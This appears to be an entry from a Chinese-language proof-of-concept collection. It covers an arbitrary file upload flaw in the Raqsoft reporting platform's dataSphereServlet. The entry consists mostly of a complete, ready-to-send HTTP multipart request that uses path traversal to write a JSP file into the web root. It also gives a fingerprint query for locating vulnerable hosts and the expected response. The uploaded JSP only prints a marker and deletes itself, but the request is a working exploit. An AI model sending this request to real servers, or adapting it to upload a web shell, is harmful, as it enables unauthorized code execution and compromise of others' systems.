﻿# 润乾报表平台 dataSphereServlet 任意文件上传漏洞

> 更新时间：2024-04-23

> 漏洞编号：

> 漏洞说明：

> 漏洞特征：body="/raqsoft"||body="润乾报表"

> 验证脚本：HTTP

```
POST /demo/servlet/dataSphereServlet?action=38 HTTP/1.1
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=----FGjhgjhvuyvuhyvulyvjhvktuvkfytft
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=D46F0E193FBD9BC2FCFB32D684296765
Connection: close

------FGjhgjhvuyvuhyvulyvjhvktuvkfytft
Content-Disposition: form-data; name="openGrpxFile"; filename="dudesuite.jsp"
Content-Type: text/plain

<% out.println("DudeSuite");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
------FGjhgjhvuyvuhyvulyvjhvktuvkfytft
Content-Disposition: form-data; name="path"

../../../
------FGjhgjhvuyvuhyvulyvjhvktuvkfytft
Content-Disposition: form-data; name="saveServer"

1
------FGjhgjhvuyvuhyvulyvjhvktuvkfytft--
```

> 响应代码特征：200

> 响应内容特征：

> 上传文件定位：/demo/dudesuite.jsp

> 验证文件来源：润乾报表平台 dataSphereServlet 任意文件上传漏洞.poc

